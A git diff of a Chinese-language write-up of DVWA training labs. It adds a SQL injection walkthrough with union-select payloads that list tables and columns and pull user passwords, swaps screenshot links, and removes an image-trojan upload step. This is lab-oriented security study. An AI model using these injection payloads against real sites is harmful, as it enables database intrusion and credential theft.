@@ -216,7 +216,7 @@ password_new是新密码，password_conf是确认密码，说明输入的信息�
 
 先看源码，对http、https、../、..//设置了过滤，将其设置为空。
 
-> <img src="https://github.com/Ki1z/DVWA/blob/main/IMG/FF6(PJ%)F%DJ}YM9]~U`V`Y.png?raw=true">
+> <img src="https://github.com/Ki1z/DVWA/blob/main/IMG/H261UM7KADQ$TYQYB1F{1{5.png?raw=true">
 
 但是仅过滤全等字符，可以用h<b>http://</b>ttp:// 来代替。其中的<b>http://</b>被设置为空后，依然存在一个http://
 
@@ -226,7 +226,7 @@ password_new是新密码，password_conf是确认密码，说明输入的信息�
 
 同样先看源码，High强制文件开头为file
 
-> <img src="https://github.com/Ki1z/DVWA/blob/main/IMG/CX8O35U8A_ANG%JAI1BHPUR.png?raw=true">
+> <img src="https://github.com/Ki1z/DVWA/blob/main/IMG/]P_BERU8WKORLPB$@]{X}Q5.png?raw=true">
 
 但是同样可以使用file协议读取文件
 
@@ -260,21 +260,87 @@ password_new是新密码，password_conf是确认密码，说明输入的信息�
 
 > <img src="https://github.com/Ki1z/DVWA/blob/main/IMG/RZEUVFA$S@4{{U8BB`VV_7B.png?raw=true">
 
-## High
+# SQL注入 SQL Injection
 
-尝试使用Medium方式上传Trojan.png，上传失败
+## Low 
 
-> <img src="https://github.com/Ki1z/DVWA/blob/main/IMG/)(G9%Q[@OTNH0XET~2WKR61.png?raw=true">
+输入ID查询相关信息，，并且ID显示在url栏中
 
-查看源码，High对上传文件的后缀名进行了判断
+> <img src="https://github.com/Ki1z/DVWA/blob/main/IMG/TQXDF2I0Z5OCKFX5}LF89L3.png?raw=true">
 
-> <img src="https://github.com/Ki1z/DVWA/blob/main/IMG/1RER[{X[~P`@5O)@AGB%4{L.png?raw=true">
+怀疑可能是将ID带入数据库中进行查询，判断是否存在注入点
 
-可以利用文件包含漏洞，制作一个图片木马
+- 使用逻辑运算符，结果不为空，可能存在注入点
 
-**基本语法：**
+> <img src="https://github.com/Ki1z/DVWA/blob/main/IMG/Z12JIO8YJKL_WNCE@%E6AWA.png?raw=true">
 
-```shell
-copy filename/B + filename newfilename
+- 使用单引号报错（单引号闭合），未过滤异常字符
+
+> <img src="https://github.com/Ki1z/DVWA/blob/main/IMG/XOR2$RA6X1TF`TCR_9GD6TL.png?raw=true">
+
+- 在引号后添加注释，正常返回结果，最终确定存在注入点
+
+> <img src="https://github.com/Ki1z/DVWA/blob/main/IMG/MKZDD6@JQ5B683}_Y8]DHZB.png?raw=true">
+
+使用order by判断字段数，避免后面使用联合查询时报错。先设定一个比较大的数目，这里选择5
+
+> <img src="https://github.com/Ki1z/DVWA/blob/main/IMG/MGQC$W(V@4ZPI6PX{}MQ35N.png?raw=true">
+
+报错，则使用二分法，这次选择3
+
+> <img src="https://github.com/Ki1z/DVWA/blob/main/IMG/I96X0DT[F9$7R38C%A_}4F7.png?raw=true">
+
+依然报错，数字减一，查询成功，可以确定结果返回两个字段
+
+> <img src="https://github.com/Ki1z/DVWA/blob/main/IMG/9SEJC$E[`C59CO~77C694AR.png?raw=true">
+
+使用union联合查询观测回显点，本题只有两个字段，就在union后的查询语句内设定两个数字，查看显示位置
+
+> <img src="https://github.com/Ki1z/DVWA/blob/main/IMG/(UJK$(3H3YD{2V[}5{6D_X0.png?raw=true">
+
+通过上图确认回显点为1，2，开始注入，查询当前数据库
+
+> <img src="https://github.com/Ki1z/DVWA/blob/main/IMG/4JWBM(F3O27X8]NLF%NAH2C.png?raw=true">
+
+查询所有表名
+
+**基本语法**
+
+```sql
+1' union select version(),group_concat(table_name) from information_schema.tables where table_schema=database() #
 ```
+
+> <img src="https://github.com/Ki1z/DVWA/blob/main/IMG/X56}@32_0@AMDSQ`K[D(DT3.png?raw=true">
+
+*注：默认情况下直接使用group_concat(fieldname)，如果报错Illegal mix of collations for operation 'UNION'，请使用group_concat(hex(fieldname))将结果转换为16进制字符，然后使用转换器获取结果*
+
+转换后的结果：guestbook , users
+
+查询users下所有字段名
+
+**基本语法**
+
+```sql
+1' union select version(),group_concat(column_name) from information_schema.columns where table_schema=database() and table_name = 'users' #
+```
+
+> <img src="https://github.com/Ki1z/DVWA/blob/main/IMG/6FSU]0ME_D7X{KQQD7[0F~J.png?raw=true">
+
+转换后的结果：user_id , first_name , last_name , user , password , avatar , last_login , failed_login
+
+从中可以看出users表内记录了user和password，获取管理员账号及密码
+
+**基本语法**
+
+```sql
+1' union select user,password from users where user_id = 1 #
+```
+
+> <img src="https://github.com/Ki1z/DVWA/blob/main/IMG/3)4{N[@)`~NEN6BC$QIGXI2.png?raw=true">
+
+对结果进行md5解密，密码为admin，注入成功
+
+> <img src="https://github.com/Ki1z/DVWA/blob/main/IMG/8H}H]60~LNE2@ZO9S5D`RFV.png?raw=true">
+
+## Medium
 
